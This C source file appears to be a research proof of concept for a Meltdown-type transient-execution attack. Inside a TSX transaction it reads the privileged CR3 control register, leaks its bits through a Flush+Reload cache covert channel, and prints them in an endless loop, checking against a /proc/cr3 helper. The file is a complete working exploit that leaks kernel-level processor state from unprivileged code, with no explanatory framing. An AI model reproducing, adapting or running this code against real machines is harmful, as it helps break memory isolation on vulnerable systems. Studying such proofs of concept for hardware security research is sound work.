#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>

#include "libcache/cacheutils.h"

int main(int argc, char **argv) {
  pagesize = sysconf(_SC_PAGESIZE);
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  // print CR3 register content
  pid_t pid = getpid();
  char pid_s[64];
  // get CR3 register for running process
  sprintf(pid_s, "echo %zd > /proc/cr3; cat /proc/cr3", (size_t)pid);
  printf("PID: %zd\n", (size_t)pid);
  printf("CR3: ");
  fflush(stdout);
  (void)system(pid_s);
  printf("\n");

  // Allocate and align shared memory
  char *_mem = malloc(pagesize * 300);
  mem = (char*)((size_t)_mem & ~(pagesize - 1)) + pagesize * 2;
  memset(mem, 0, pagesize * 290);

  // Flush our shared memory
  flush_shared_memory();

  while(1) {
    // Start TSX
    if(try_start()) {
      // Null pointer access prolongs transient window
      maccess(0);
      // Encode content of the CR3 register in the cache
      asm volatile("movq %%cr3, %%rax\n"
                   "andq $0xff000, %%rax\n"
                   "movq (%%rbx,%%rax,1), %%rbx\n"
                   :
                   : "b"(mem)
                   : "rax");
      try_abort();
    }
    try_end();

    int i;
    // Recover data from the covert channel
    for(i = 0; i < 256; i++) {
      if(flush_reload(mem + i * pagesize)) {
        printf("%x ", i);
        fflush(stdout);
        sched_yield();
      }
    }
    sched_yield();
  }

  free(_mem);
  return EXIT_SUCCESS;
}
